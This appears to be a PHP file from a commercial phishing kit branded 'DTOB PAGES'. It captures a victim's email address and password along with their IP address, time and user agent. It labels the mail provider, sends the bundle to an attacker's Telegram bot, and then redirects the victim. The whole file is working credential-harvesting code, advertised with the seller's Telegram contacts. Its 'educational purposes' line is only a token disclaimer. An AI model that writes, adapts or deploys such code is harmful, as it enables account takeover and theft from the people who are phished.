<?php
session_start();
error_reporting(0);

include "../../setting.php";
/*   DTOB PAGES - coder @dtob1804
JOIN CHANNEL t.me/dtobpages ON TELEGRAM OR KEYBASE
CONTACT CODE t.me/dtob1804 ON TELEGRAM OR KEYBASE
Only use for educational purposes. 
Subject to copyright. Copyright © 2023 DTOB1804 PAGES */

$telegram = $telesave;
$smail = $_SESSION['UName'];
$stype = "";
$pinput = $_POST['PName'];
$piip = $_SERVER['REMOTE_ADDR'];
$date = date('m/d/Y h:i:s a', time());
$useragent = $_SERVER['HTTP_USER_AGENT'];
if (str_contains($smail, "@yahoo")) {
    $stype = "yahoo";}
else if (str_contains($smail, "@gmail")) {
    $stype = "gmail";}
else if (str_contains($smail, "@aol")) {
    $stype = "aol";}
else if (str_contains($smail, "@outlook")) {
    $stype = "outlook";}
else if (str_contains($smail, "@hotmail")) {
    $stype = "hotmail";}
else if (str_contains($smail, "@ymail")) {
    $stype = "yahoo";}
else if (str_contains($smail, "@comcast")) {
    $stype = "comcast";}
else if (str_contains($smail, "@charter")) {
    $stype = "spectrum";}
    else{
        $stype = "office/other";
    }


$data="
# ----- EMAIL ACCESS | $piip ----- #

↳ 【 Type  ⇢ $stype
↳ 【 Email Address ⇢ $smail
↳ 【 Password⇢ $pinput

  #  ----- FINGERPRINT  ----- #

↳ 【 IP  ⇢ $piip
↳ 【 SESSION DATE ⇢ $date
↳ 【 USER AGENT ⇢ $useragent



===== |⫸ SUNCOAST DTOBPAGES ⫷| =====

Copyright © 2023 DTOBPAGES
JOIN CHANNEL: @dtobpages
#################################
";





$txt=$data;

if($telegram=='Yessir'){
$send=['chat_id'=>$chat_id,'text'=>$txt];
$website="https://api.telegram.org/bot$bot_url";
$ch=curl_init($website.'/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result=curl_exec($ch);
curl_close($ch);
}

header("location:../i-a.php");

/*
 ,'|"\   _______  .---.  ,---.     ,---.    .--.    ,--,   ,---.     .---. 
 | |\ \ |__   __|/ .-. ) | .-.\    | .-.\  / /\ \ .' .'    | .-'    ( .-._)
 | | \ \  )| |   | | |(_)| |-' \   | |-' )/ /__\ \|  |  __ | `-.   (_) \   
 | |  \ \(_) |   | | | | | |--. \  | |--' |  __  |\  \ ( _)| .-'   _  \ \  
 /(|`-' /  | |   \ `-' / | |`-' /  | |    | |  |)| \  `-) )|  `--.( `-'  ) 
(__)`--'   `-'    )---'  /( `--'   /(     |_|  (_) )\____/ /( __.' `----'  
                 (_)    (__)      (__)            (__)    (__)             
                 CONTACT ON TELEGRAM @dtobpages
                 
*/
?>